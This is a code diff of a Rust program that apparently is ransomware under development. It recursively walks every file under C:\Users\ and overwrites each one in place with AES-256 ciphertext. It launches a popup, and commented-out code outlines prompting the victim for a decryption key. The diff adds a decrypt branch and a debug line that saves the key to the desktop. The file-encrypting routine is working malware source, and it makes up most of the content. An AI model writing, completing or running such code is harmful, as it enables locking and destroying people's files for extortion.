@@ -17,6 +17,15 @@ use walkdir::{DirEntry, Error, WalkDir};
 //TODO: check the speed of this later
 //TODO: gonna need to add more later,
 
+/**
+ * Use AES-256
+ * Same key for all files, different nonce for each file
+ *
+ * Notes: nonce is to make sure 2 identical plaintexts produce different output
+ * counter is to make sure 2 identical blocks within the same plaintext produce different output
+ *
+ * Returns: the cipher object
+ */
 fn main() {
     // create a popup on windows systems
 
@@ -26,15 +35,6 @@ fn main() {
         .spawn()
         .expect("ruh roh");
 
-    /**
-     * Use AES-256
-     * Same key for all files, different nonce for each file
-     *
-     * Notes: nonce is to make sure 2 identical plaintexts produce different output
-     * counter is to make sure 2 identical blocks within the same plaintext produce different output
-     *
-     * Returns: the cipher object
-     */
     let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
@@ -45,6 +45,33 @@ fn main() {
     let cipher = Aes256GcmSiv::new(&key);
 
     traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
+
+    //TESTCODE: delete later. shows the key so i dont lock myself out
+    //create a file called key.txt and write the key to it
+    let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
+    writeln!(key_file.as_ref().unwrap(), "key: {:?}", key);
+
+    // loop {
+    //     //TODO: move all of this to a decryption function
+    //     let mut user_input = String::new();
+    //     //FIXME: thisis the popup stage
+    //     println!("Enter decryption key pls: ");
+    //     io::stdin().read_line(&mut user_input).unwrap();
+    //     let user_input_bytes = user_input.as_bytes(); //convert to bytes
+
+    //     //TODO: UP TO HERE TODAY
+    //     //key length 32, nonce length 12
+    //     if user_input_bytes.len() != 32 {
+    //         //print error
+    //         println!("Invalid key length");
+    //     } else {
+    //         // //FIXME: convert byte array into key format why this no work
+    //         // //WHY THIS NO WORK
+    //         // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
+    //         // //decrypt using the key
+    //         // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
+    //     }
+    // }
 }
 
 /**
@@ -149,21 +176,25 @@ fn test_encryptfile() {
 fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
-    let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
+    let mut test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
 
     for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
         match entry {
             Ok(entry) => {
                 writeln!(
                     //this is just debug code
-                    file.as_ref().unwrap(),
+                    test_file.as_ref().unwrap(),
                     "found file: {}",
                     entry.path().display()
                 );
-                encrypt(entry.path(), cipher);
+                if do_encrypt {
+                    encrypt(entry.path(), cipher);
+                } else {
+                    decrypt(entry.path(), cipher);
+                }
             }
             Err(e) => {
-                writeln!(file.as_ref().unwrap(), "Error: {}", e);
+                writeln!(test_file.as_ref().unwrap(), "Error: {}", e);
             }
         }
     }
@@ -189,12 +220,10 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) {
     //put the ciphertext bac into the file
     file.set_len(0);
     file.write_all(&ciphertext.unwrap().as_slice());
-
-    //TESTCODE: delete later. shows the key so i dont lock myself out
 }
 
 /**
- * Decrypt a file
+ * Decrypt a file using a given key
  */
 fn decrypt(path: &Path, cipher: &Aes256GcmSiv) {
     //
